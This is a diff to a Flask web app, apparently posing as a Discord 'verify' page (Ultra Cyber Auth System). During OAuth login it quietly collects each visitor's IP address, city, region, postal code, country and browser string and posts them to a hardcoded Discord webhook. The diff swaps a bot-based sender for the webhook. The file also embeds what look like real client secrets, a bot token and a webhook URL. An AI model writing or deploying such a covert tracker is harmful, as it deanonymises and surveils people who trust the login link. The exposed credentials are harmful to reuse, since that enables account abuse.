@@ -4,8 +4,6 @@ from flask import Flask, request, redirect, render_template
 from datetime import datetime
 import pytz
 import urllib.parse
-import asyncio
-import discord
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -14,14 +12,10 @@ DISCORD_CLIENT_ID = "1366806821456838727"
 DISCORD_CLIENT_SECRET = "4nsa1A8noxdUX_D54GYG0VXL4cCZJ1dX"
 REDIRECT_URI = "https://verify-tr0-4.onrender.com/callback"
 
-# Botトークンと送信先チャンネルIDを指定
-DISCORD_BOT_TOKEN = "MTM2NjgwNjgyMTQ1NjgzODcyNw.G_ovuw.AJtnwlfvR5AURrWaXDNvFz1hAnMyH62NuDhCo0"
-DISCORD_CHANNEL_ID = 1366804810464235713  # ←ここを送信したいチャンネルIDに置き換える
+# ✅ Webhook URL（自分のWebhook URLに置き換えてください）
+WEBHOOK_URL = "https://discord.com/api/webhooks/1374794041178456116/Aj69orzMQtgBptVhkmTsLmko9GKrGbiv7fS1COSOrwX2i22xI5G5e4IGhAgAK5ngZUec"
 
-# Botの初期化
-intents = discord.Intents.default()
-bot = discord.Client(intents=intents)
-
+# IP位置情報取得
 def get_location(ip):
     try:
         res = requests.get(f"https://ipapi.co/{ip}/json/").json()
@@ -34,6 +28,18 @@ def get_location(ip):
         }
     except:
         return {"ip": ip, "city": "不明", "region": "不明", "postal": "不明", "country": "不明"}
+
+# Webhook送信
+def send_webhook(message):
+    try:
+        data = {
+            "content": message
+        }
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code != 204:
+            print(f"[!] Webhook送信失敗: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"[!] Webhook送信エラー: {e}")
 
 @app.route('/')
 def index():
@@ -94,42 +100,23 @@ def callback():
     now = datetime.now(jst).strftime("%Y-%m-%d %H:%M:%S")
 
     message_content = (
-        f"📥 新しいアクセス\n"
-        f"🕒 時間: {now}\n"
-        f"👤 ユーザー: {username} (`{user_id}`)\n"
-        f"🌍 IP: {location['ip']}\n"
-        f"📍 地域: {location['region']}（{location['city']}）\n"
-        f"〒 郵便番号: {location['postal']}\n"
-        f"🗺️ マップ: https://www.google.com/maps?q={location['ip']}\n"
-        f"🧭 国: {location['country']}\n"
-        f"🖥️ UA: {request.headers.get('User-Agent')}\n"
-        f"Ultra Cyber Auth System"
+        f"📥 **新しいアクセス検知**\n"
+        f"🕒 **時間:** {now}\n"
+        f"👤 **ユーザー:** {username} (`{user_id}`)\n"
+        f"🌍 **IP:** {location['ip']}\n"
+        f"📍 **地域:** {location['region']}（{location['city']}）\n"
+        f"〒 **郵便番号:** {location['postal']}\n"
+        f"🗺️ **マップ:** https://www.google.com/maps?q={location['ip']}\n"
+        f"🧭 **国:** {location['country']}\n"
+        f"🖥️ **UA:** {request.headers.get('User-Agent')}\n"
+        f"`Ultra Cyber Auth System`"
     )
 
-    async def send_to_channel():
-        try:
-            channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
-            if channel:
-                await channel.send(message_content)
-        except Exception as e:
-            print(f"チャンネル送信でエラー: {e}")
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(send_to_channel())
-    loop.close()
+    # ✅ Webhook送信
+    send_webhook(message_content)
 
     return f"ようこそ、{username} さん！ 認証が完了しました。"
 
 if __name__ == "__main__":
-    import threading
-
-    def run_flask():
-        port = int(os.environ.get("PORT", 5000))
-        app.run(host="0.0.0.0", port=port)
-
-    def run_bot():
-        bot.run(DISCORD_BOT_TOKEN)
-
-    threading.Thread(target=run_flask).start()
-    run_bot()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
